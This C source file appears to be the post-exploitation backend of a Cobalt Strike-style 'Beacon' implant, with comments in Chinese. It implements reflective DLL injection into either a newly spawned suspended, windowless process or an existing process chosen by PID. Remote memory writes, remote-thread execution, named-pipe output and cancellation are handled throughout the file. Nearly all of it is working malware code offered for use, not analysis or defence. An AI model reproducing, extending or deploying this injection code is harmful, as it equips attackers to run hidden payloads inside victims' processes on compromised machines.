#include "beacon_postex_backend.h"
#include "beacon_inject.h"

/* 读取远程 PostExConfig，判断远程模块是否已经完成或被取消。 */
BOOL PostExRemoteCompleted(PostExJob* job)
{
    PostExConfig snapshot;
    SIZE_T read_bytes = 0;

    if (!job || !job->process || !job->remote_config) {
        return FALSE;
    }

    ZeroMemory(&snapshot, sizeof(snapshot));
    if (!ReadProcessMemory(job->process, job->remote_config,
                           &snapshot, sizeof(snapshot), &read_bytes) ||
        read_bytes < (SIZE_T)FIELD_OFFSET(PostExConfig, pipe_name)) {
        return FALSE;
    }

    return snapshot.magic == POSTEX_CONFIG_MAGIC &&
           (snapshot.stage == POSTEX_STAGE_DONE ||
            snapshot.stage == POSTEX_STAGE_CANCELLED);
}

/* 构造 PostEx spawn 命令行，保留 exe 路径引号以兼容空格路径。 */
BOOL PostExBuildSpawnCommandLine(const CHAR* exe_path, const CHAR* args,
                                 CHAR* out, SIZE_T out_size)
{
    if (!exe_path || !exe_path[0] || !out || out_size == 0) return FALSE;
    if (args && args[0]) {
        return _snprintf_s(out, out_size, _TRUNCATE,
                           "\"%s\" %s", exe_path, args) > 0;
    }
    return _snprintf_s(out, out_size, _TRUNCATE,
                       "\"%s\"", exe_path) > 0;
}

/* 初始化传给远程 PostEx 模块的配置块。 */
VOID PostExFillConfig(PostExConfig* config, const WCHAR* pipe_name,
                      const CHAR* args)
{
    if (!config) return;
    ZeroMemory(config, sizeof(*config));
    config->magic = POSTEX_CONFIG_MAGIC;
    config->version = POSTEX_CONFIG_VERSION;
    if (pipe_name) {
        wcsncpy_s(config->pipe_name, _countof(config->pipe_name), pipe_name, _TRUNCATE);
    }
    config->output_format = POSTEX_OUTPUT_FRAME;
    if (args && args[0]) {
        strncpy_s(config->args, sizeof(config->args), args, _TRUNCATE);
    }
}

/* 格式化远程线程状态，用于 job/status 输出和失败诊断。 */
VOID PostExFormatRemoteThreadStatus(HANDLE thread, CHAR* out, SIZE_T out_size)
{
    DWORD wait_rc;
    DWORD exit_code = 0;

    if (!out || out_size == 0) return;
    out[0] = '\0';
    if (!thread) {
        strcpy_s(out, out_size, "remote_thread=null");
        return;
    }

    wait_rc = WaitForSingleObject(thread, 0);
    if (wait_rc == WAIT_TIMEOUT) {
        strcpy_s(out, out_size, "remote_thread=running");
        return;
    }
    if (wait_rc == WAIT_OBJECT_0) {
        if (GetExitCodeThread(thread, &exit_code)) {
            _snprintf_s(out, out_size, _TRUNCATE,
                        "remote_thread=exited:0x%08lx",
                        (unsigned long)exit_code);
        } else {
            _snprintf_s(out, out_size, _TRUNCATE,
                        "remote_thread=exited:GetExitCodeThread failed:%lu",
                        (unsigned long)GetLastError());
        }
        return;
    }

    _snprintf_s(out, out_size, _TRUNCATE,
                "remote_thread=wait_failed:%lu",
                (unsigned long)GetLastError());
}

/* 格式化远程配置块状态，便于判断远程模块卡在哪个阶段。 */
VOID PostExFormatRemoteConfigStatus(HANDLE process, PVOID remote_config,
                                    CHAR* out, SIZE_T out_size)
{
    PostExConfig snapshot;
    SIZE_T read_bytes = 0;

    if (!out || out_size == 0) return;
    out[0] = '\0';

    if (!process || !remote_config) {
        strcpy_s(out, out_size, "remote_config=null");
        return;
    }

    ZeroMemory(&snapshot, sizeof(snapshot));
    if (!ReadProcessMemory(process, remote_config, &snapshot, sizeof(snapshot), &read_bytes) ||
        read_bytes < (SIZE_T)FIELD_OFFSET(PostExConfig, pipe_name)) {
        _snprintf_s(out, out_size, _TRUNCATE,
                    "remote_config=read_failed:%lu",
                    (unsigned long)GetLastError());
        return;
    }

    if (snapshot.magic != POSTEX_CONFIG_MAGIC) {
        _snprintf_s(out, out_size, _TRUNCATE,
                    "remote_config=bad_magic:0x%08lx",
                    (unsigned long)snapshot.magic);
        return;
    }

    _snprintf_s(out, out_size, _TRUNCATE,
                "remote_stage=%lu remote_error=%lu control=0x%08lx cancel_reason=%lu",
                (unsigned long)snapshot.stage,
                (unsigned long)snapshot.last_error,
                (unsigned long)snapshot.control_flags,
                (unsigned long)snapshot.cancel_reason);
}

/* 校验 PostEx DLL 与当前 Beacon 架构一致。 */
static BOOL PostExValidateDllMachineForBeacon(const ByteBuf* dll,
                                               WORD* dll_machine,
                                               CHAR* err,
                                               SIZE_T err_size)
{
    WORD machine = 0;
    WORD beacon_machine = InjectCurrentMachine();

    if (!InjectImageMachine(dll, "postex dll", &machine, err, err_size)) {
        return FALSE;
    }

    if (dll_machine) *dll_machine = machine;
    if (!beacon_machine || machine != beacon_machine) {
        if (err) _snprintf_s(err, err_size, _TRUNCATE,
                             "postex arch mismatch: beacon=%s dll=%s",
                             InjectMachineName(beacon_machine),
                             InjectMachineName(machine));
        return FALSE;
    }

    return TRUE;
}

/* 校验目标进程架构与 PostEx DLL 架构一致。 */
static BOOL PostExValidateTargetMachine(HANDLE process,
                                         WORD dll_machine,
                                         CHAR* err,
                                        SIZE_T err_size)
{
    WORD target_machine = 0;

    if (!InjectGetProcessMachine(process, "postex target",
                                 &target_machine, err, err_size)) {
        return FALSE;
    }
    if (target_machine != dll_machine) {
        if (err) _snprintf_s(err, err_size, _TRUNCATE,
                             "postex arch mismatch: dll=%s target=%s",
                             InjectMachineName(dll_machine),
                             InjectMachineName(target_machine));
        return FALSE;
    }

    return TRUE;
}

/* 准备远程 reflective DLL 和 PostExConfig，返回远程入口与资源地址。 */
BOOL PostExPrepareRemoteReflective(HANDLE process, const ByteBuf* dll,
                                   const PostExConfig* config,
                                   PVOID* remote_image,
                                   SIZE_T* remote_image_size,
                                   PVOID* remote_config,
                                   PVOID* remote_entry,
                                   CHAR* err, SIZE_T err_size)
{
    InjectRequest req;
    InjectResult result;

    if (remote_image) *remote_image = NULL;
    if (remote_image_size) *remote_image_size = 0;
    if (remote_config) *remote_config = NULL;
    if (remote_entry) *remote_entry = NULL;
    if (err && err_size) err[0] = '\0';

    if (!process || !dll || !dll->data || dll->len < sizeof(IMAGE_DOS_HEADER) ||
        !config || !remote_image || !remote_config || !remote_entry) {
        if (err) strcpy_s(err, err_size, "invalid remote reflective request");
        return FALSE;
    }

    ZeroMemory(&req, sizeof(req));
    InjectResultInit(&result);
    req.method = INJECT_METHOD_REFLECTIVE;
    req.process = process;
    req.image = dll;
    req.parameter = config;
    req.parameter_size = sizeof(*config);
    req.entry_export = "REFLoader";
    req.required_machine = InjectCurrentMachine();
    req.image_label = "image";
    req.parameter_label = "config";
    req.invalid_request_error = "invalid remote reflective request";
    req.missing_export_error = "reflective DLL missing REFLoader export";
    if (!InjectPrepare(&req, &result, err, err_size)) return FALSE;

    *remote_image = result.remote_image;
    if (remote_image_size) *remote_image_size = result.remote_image_size;
    *remote_config = result.remote_parameter;
    *remote_entry = result.remote_entry;
    return TRUE;
}

/* 启动 reflective DLL 入口线程，参数为远程 PostExConfig 地址。 */
BOOL PostExCreateRemoteReflectiveThread(HANDLE process,
                                        PVOID remote_entry,
                                        PVOID remote_config,
                                        HANDLE* remote_thread,
                                        CHAR* err, SIZE_T err_size)
{
    if (!remote_config) {
        if (remote_thread) *remote_thread = NULL;
        if (err && err_size) err[0] = '\0';
        if (err) strcpy_s(err, err_size, "invalid remote reflective entry");
        return FALSE;
    }
    return InjectCreateRemoteThread(process, remote_entry, remote_config,
                                    5, 150,
                                    "invalid remote reflective entry",
                                    remote_thread, err, err_size);
}

/* 完成 reflective DLL 的准备与启动，并在启动失败时回滚远程内存。 */
BOOL PostExStartRemoteReflective(HANDLE process, const ByteBuf* dll,
                                 const PostExConfig* config,
                                 PVOID* remote_image,
                                 SIZE_T* remote_image_size,
                                 PVOID* remote_config,
                                 HANDLE* remote_thread,
                                 CHAR* err, SIZE_T err_size)
{
    PVOID remote_entry = NULL;

    if (!PostExPrepareRemoteReflective(process, dll, config,
                                       remote_image, remote_image_size,
                                       remote_config, &remote_entry,
                                       err, err_size)) {
        return FALSE;
    }

    if (!PostExCreateRemoteReflectiveThread(process, remote_entry, *remote_config,
                                            remote_thread, err, err_size)) {
        InjectResult cleanup_remote;
        InjectResultInit(&cleanup_remote);
        cleanup_remote.remote_image = *remote_image;
        cleanup_remote.remote_image_size = remote_image_size ? *remote_image_size : 0;
        cleanup_remote.remote_parameter = *remote_config;
        cleanup_remote.remote_parameter_size = sizeof(*config);
        InjectFreeRemote(process, &cleanup_remote);
        *remote_config = NULL;
        *remote_image = NULL;
        if (remote_image_size) *remote_image_size = 0;
        return FALSE;
    }

    return TRUE;
}

/* PostEx spawn：创建挂起进程、写入 DLL/config、恢复进程并启动远程线程。 */
BOOL PostExStartSpawnRemote(const PostExStartRequest* req,
                            HANDLE* process,
                            HANDLE* remote_thread,
                            PVOID* remote_image,
                            PVOID* remote_config,
                            DWORD* pid,
                            CHAR* err,
                            SIZE_T err_size)
{
    CHAR command_line[POSTEX_CMDLINE_MAX];
    WCHAR* command_line_w = NULL;
    WCHAR* pipe_name_w = NULL;
    PostExConfig config;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    PVOID remote_entry = NULL;
    SIZE_T remote_image_size = 0;
    WORD dll_machine = 0;

    if (process) *process = NULL;
    if (remote_thread) *remote_thread = NULL;
    if (remote_image) *remote_image = NULL;
    if (remote_config) *remote_config = NULL;
    if (pid) *pid = 0;
    if (err && err_size) err[0] = '\0';

    if (!req || !process || !remote_thread || !remote_image || !remote_config || !pid) {
        if (err) strcpy_s(err, err_size, "invalid postex spawn request");
        return FALSE;
    }
    if (!PostExValidateDllMachineForBeacon(&req->dll, &dll_machine,
                                           err, err_size)) {
        return FALSE;
    }
    if (!PostExBuildSpawnCommandLine(req->spawn_path, req->spawn_args,
                                     command_line, sizeof(command_line))) {
        if (err) strcpy_s(err, err_size, "postex spawn command line too long");
        return FALSE;
    }

    /* PostEx 需要 pipe 名写入远程配置，因此准备 DLL 前先完成字符串转换。 */
    command_line_w = Utf8ToWide(command_line);
    pipe_name_w = Utf8ToWide(req->pipe_name);
    if (!command_line_w || !pipe_name_w) {
        if (err) strcpy_s(err, err_size, "postex spawn string conversion failed");
        HeapFree(GetProcessHeap(), 0, command_line_w);
        HeapFree(GetProcessHeap(), 0, pipe_name_w);
        return FALSE;
    }

    PostExFillConfig(&config, pipe_name_w, req->module_args);
    config.flags |= POSTEX_CONFIG_FLAG_REMOTE;

    /* 先挂起宿主，完成远程 DLL/config 写入后再恢复主线程。 */
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    if (!CreateProcessW(NULL, command_line_w, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        if (err) _snprintf_s(err, err_size, _TRUNCATE,
                             "postex spawn CreateProcess failed: %lu",
                             (unsigned long)GetLastError());
        HeapFree(GetProcessHeap(), 0, command_line_w);
        HeapFree(GetProcessHeap(), 0, pipe_name_w);
        return FALSE;
    }
    if (!PostExValidateTargetMachine(pi.hProcess, dll_machine, err, err_size)) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        HeapFree(GetProcessHeap(), 0, command_line_w);
        HeapFree(GetProcessHeap(), 0, pipe_name_w);
        return FALSE;
    }

    if (!PostExPrepareRemoteReflective(pi.hProcess, &req->dll, &config,
                                       remote_image, &remote_image_size,
                                       remote_config, &remote_entry,
                                       err, err_size)) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        HeapFree(GetProcessHeap(), 0, command_line_w);
        HeapFree(GetProcessHeap(), 0, pipe_name_w);
        return FALSE;
    }

    /* 恢复宿主后再创建远程线程，避免目标仍处于过早初始化状态。 */
    ResumeThread(pi.hThread);
    WaitForInputIdle(pi.hProcess, 1000);
    CloseHandle(pi.hThread);
    pi.hThread = NULL;

    if (!PostExCreateRemoteReflectiveThread(pi.hProcess, remote_entry, *remote_config,
                                            remote_thread, err, err_size)) {
        InjectResult cleanup_remote;
        InjectResultInit(&cleanup_remote);
        cleanup_remote.remote_image = *remote_image;
        cleanup_remote.remote_image_size = remote_image_size;
        cleanup_remote.remote_parameter = *remote_config;
        cleanup_remote.remote_parameter_size = sizeof(config);
        InjectFreeRemote(pi.hProcess, &cleanup_remote);
        *remote_config = NULL;
        *remote_image = NULL;
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        HeapFree(GetProcessHeap(), 0, command_line_w);
        HeapFree(GetProcessHeap(), 0, pipe_name_w);
        return FALSE;
    }

    *process = pi.hProcess;
    *pid = pi.dwProcessId;
    HeapFree(GetProcessHeap(), 0, command_line_w);
    HeapFree(GetProcessHeap(), 0, pipe_name_w);
    return TRUE;
}

/* PostEx inject：打开既有进程、写入 DLL/config 并启动远程线程。 */
BOOL PostExStartInjectRemote(const PostExStartRequest* req,
                             HANDLE* process,
                             HANDLE* remote_thread,
                             PVOID* remote_image,
                             PVOID* remote_config,
                             CHAR* err,
                             SIZE_T err_size)
{
    WCHAR* pipe_name_w = NULL;
    PostExConfig config;
    SIZE_T remote_image_size = 0;
    WORD dll_machine = 0;

    if (process) *process = NULL;
    if (remote_thread) *remote_thread = NULL;
    if (remote_image) *remote_image = NULL;
    if (remote_config) *remote_config = NULL;
    if (err && err_size) err[0] = '\0';

    if (!req || !process || !remote_thread || !remote_image || !remote_config) {
        if (err) strcpy_s(err, err_size, "invalid postex inject request");
        return FALSE;
    }
    if (!PostExValidateDllMachineForBeacon(&req->dll, &dll_machine,
                                           err, err_size)) {
        return FALSE;
    }

    pipe_name_w = Utf8ToWide(req->pipe_name);
    if (!pipe_name_w) {
        if (err) strcpy_s(err, err_size, "postex pipe name conversion failed");
        return FALSE;
    }

    PostExFillConfig(&config, pipe_name_w, req->module_args);
    config.flags |= POSTEX_CONFIG_FLAG_REMOTE;

    /* 既有目标进程不归本 job 所有，失败路径只关闭句柄和释放本次资源。 */
    *process = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                           PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                           PROCESS_VM_READ | SYNCHRONIZE,
                           FALSE, req->target_pid);
    if (!*process) {
        if (err) _snprintf_s(err, err_size, _TRUNCATE,
                             "postex OpenProcess failed: %lu",
                             (unsigned long)GetLastError());
        HeapFree(GetProcessHeap(), 0, pipe_name_w);
        return FALSE;
    }
    if (!PostExValidateTargetMachine(*process, dll_machine, err, err_size)) {
        CloseHandle(*process);
        *process = NULL;
        HeapFree(GetProcessHeap(), 0, pipe_name_w);
        return FALSE;
    }

    if (!PostExStartRemoteReflective(*process, &req->dll, &config,
                                     remote_image, &remote_image_size,
                                     remote_config, remote_thread,
                                     err, err_size)) {
        CloseHandle(*process);
        *process = NULL;
        HeapFree(GetProcessHeap(), 0, pipe_name_w);
        return FALSE;
    }

    HeapFree(GetProcessHeap(), 0, pipe_name_w);
    return TRUE;
}

/* 清理运行中的 PostEx job；仅在远程模块已完成时释放远程内存。 */
static VOID PostExRemoteThreadCleanupJob(PostExJob* job, BOOL kill_process)
{
    BOOL terminate_owned_process;
    BOOL release_remote_memory;

    if (!job) return;

    if (job->remote_thread) {
        WaitForSingleObject(job->remote_thread, 1000);
        CloseHandle(job->remote_thread);
        job->remote_thread = NULL;
    }
    if (!job->process) {
        return;
    }

    terminate_owned_process = kill_process && job->owns_process &&
                              WaitForSingleObject(job->process, 0) != WAIT_OBJECT_0;
    release_remote_memory = !terminate_owned_process &&
                            PostExRemoteCompleted(job);

    if (release_remote_memory) {
        InjectResult cleanup_remote;
        InjectResultInit(&cleanup_remote);
        cleanup_remote.remote_image = job->remote_image;
        cleanup_remote.remote_parameter = job->remote_config;
        cleanup_remote.remote_parameter_size = sizeof(PostExConfig);
        InjectFreeRemote(job->process, &cleanup_remote);
        job->remote_image = NULL;
        job->remote_config = NULL;
    }

    if (terminate_owned_process) {
        TerminateProcess(job->process, 1);
    }
    CloseHandle(job->process);
    job->process = NULL;
}

/* 清理启动阶段的临时结果，主要用于启动失败后的回滚。 */
static VOID PostExRemoteThreadCleanupStartResult(const PostExStartRequest* req,
                                                 PostExStartResult* result)
{
    if (!result) return;

    if (result->remote_thread) {
        CloseHandle(result->remote_thread);
        result->remote_thread = NULL;
    }
    if (result->process) {
        InjectResult cleanup_remote;
        InjectResultInit(&cleanup_remote);
        cleanup_remote.remote_image = result->remote_image;
        cleanup_remote.remote_parameter = result->remote_config;
        cleanup_remote.remote_parameter_size = sizeof(PostExConfig);
        InjectFreeRemote(result->process, &cleanup_remote);
        result->remote_image = NULL;
        result->remote_config = NULL;
        if (req && result->owns_process &&
            WaitForSingleObject(result->process, 0) != WAIT_OBJECT_0) {
            TerminateProcess(result->process, 1);
        }
        CloseHandle(result->process);
        result->process = NULL;
    }
    PostExStartResultInit(result);
}

/* 通过远程 PostExConfig 设置取消标志，由远程模块协作式退出。 */
static BOOL PostExRemoteThreadCancelJob(PostExJob* job, UINT32 reason)
{
    DWORD flags = 0;
    DWORD cancel_reason;
    SIZE_T done = 0;
    PBYTE base;

    if (!job || !job->process || !job->remote_config) {
        return FALSE;
    }

    base = (PBYTE)job->remote_config;
    cancel_reason = reason ? reason : POSTEX_CANCEL_REASON_USER;

    ReadProcessMemory(job->process,
                      base + FIELD_OFFSET(PostExConfig, control_flags),
                      &flags, sizeof(flags), &done);
    flags |= POSTEX_CONFIG_CONTROL_CANCEL;

    done = 0;
    if (!WriteProcessMemory(job->process,
                            base + FIELD_OFFSET(PostExConfig, cancel_reason),
                            &cancel_reason, sizeof(cancel_reason), &done) ||
        done != sizeof(cancel_reason)) {
        return FALSE;
    }

    done = 0;
    if (!WriteProcessMemory(job->process,
                            base + FIELD_OFFSET(PostExConfig, control_flags),
                            &flags, sizeof(flags), &done) ||
        done != sizeof(flags)) {
        return FALSE;
    }

    return TRUE;
}

/* 初始化 PostEx 后端启动结果结构。 */
VOID PostExStartResultInit(PostExStartResult* result)
{
    if (result) {
        ZeroMemory(result, sizeof(*result));
    }
}

/* remote-thread 后端入口：按 PostEx 子命令选择 spawn 或 inject。 */
static BOOL PostExRemoteThreadStart(const PostExStartRequest* req,
                                    PostExStartResult* result,
                                    CHAR* err,
                                    SIZE_T err_size)
{
    result->owns_process = req->owns_process;
    result->pid = req->target_pid;
    result->backend_kind = POSTEX_BACKEND_REMOTE_THREAD;

    if (req->subcmd == POSTEX_SUBCMD_SPAWN_DLL) {
        return PostExStartSpawnRemote(req,
                                      &result->process,
                                      &result->remote_thread,
                                      &result->remote_image,
                                      &result->remote_config,
                                      &result->pid,
                                      err,
                                      err_size);
    }

    if (req->subcmd == POSTEX_SUBCMD_INJECT_DLL) {
        return PostExStartInjectRemote(req,
                                       &result->process,
                                       &result->remote_thread,
                                       &result->remote_image,
                                       &result->remote_config,
                                       err,
                                       err_size);
    }

    if (err) strcpy_s(err, err_size, "remote-thread backend unsupported postex subcommand");
    PostExStartResultInit(result);
    return FALSE;
}

/* PostEx 后端注册表；当前保留既有 backend name 字段，不在本次改动扩大行为面。 */
static const PostExBackendOps g_postex_backends[] = {
    {
        POSTEX_BACKEND_REMOTE_THREAD,
        "remote-thread",
        POSTEX_BACKEND_CAP_SPAWN_DLL | POSTEX_BACKEND_CAP_INJECT_DLL,
        PostExRemoteThreadStart,
        PostExRemoteThreadCleanupStartResult,
        PostExRemoteThreadCleanupJob,
        PostExRemoteThreadCancelJob
    }
};

/* 按 kind 查找 PostEx 后端，kind 为 0 时走默认 remote-thread 后端。 */
const PostExBackendOps* PostExBackendFind(UINT32 kind)
{
    SIZE_T i;

    if (kind == 0) {
        kind = POSTEX_BACKEND_REMOTE_THREAD;
    }
    for (i = 0; i < _countof(g_postex_backends); ++i) {
        if (g_postex_backends[i].kind == kind) {
            return &g_postex_backends[i];
        }
    }
    return NULL;
}

/* 调用后端专属启动失败清理逻辑。 */
VOID PostExBackendCleanupStartResult(const PostExStartRequest* req,
                                     PostExStartResult* result)
{
    const PostExBackendOps* backend;

    if (!result) return;
    backend = PostExBackendFind(result->backend_kind);
    if (backend && backend->CleanupStartResult) {
        backend->CleanupStartResult(req, result);
        return;
    }
    PostExStartResultInit(result);
}

/* 调用后端专属 job 清理逻辑。 */
VOID PostExBackendCleanupJob(PostExJob* job, BOOL kill_process)
{
    const PostExBackendOps* backend;

    if (!job) return;
    backend = PostExBackendFind(job->backend_kind);
    if (backend && backend->CleanupJob) {
        backend->CleanupJob(job, kill_process);
    }
}

/* 调用后端专属取消逻辑。 */
BOOL PostExBackendCancelJob(PostExJob* job, UINT32 reason)
{
    const PostExBackendOps* backend;

    if (!job) return FALSE;
    backend = PostExBackendFind(job->backend_kind);
    if (backend && backend->CancelJob) {
        return backend->CancelJob(job, reason);
    }
    return FALSE;
}

/* PostEx 后端统一启动入口，负责默认后端选择和分发表调用。 */
BOOL PostExStartRemote(const PostExStartRequest* req,
                       PostExStartResult* result,
                       CHAR* err,
                       SIZE_T err_size)
{
    const PostExBackendOps* backend;
    UINT32 backend_kind;

    if (err && err_size) err[0] = '\0';
    PostExStartResultInit(result);

    if (!req || !result) {
        if (err) strcpy_s(err, err_size, "invalid postex backend request");
        return FALSE;
    }

    backend_kind = req->backend_kind ? req->backend_kind :
                   POSTEX_BACKEND_REMOTE_THREAD;
    backend = PostExBackendFind(backend_kind);
    if (!backend || !backend->Start) {
        if (err) _snprintf_s(err, err_size, _TRUNCATE,
                             "unknown postex backend: %lu",
                             (unsigned long)backend_kind);
        return FALSE;
    }

    return backend->Start(req, result, err, err_size);
}
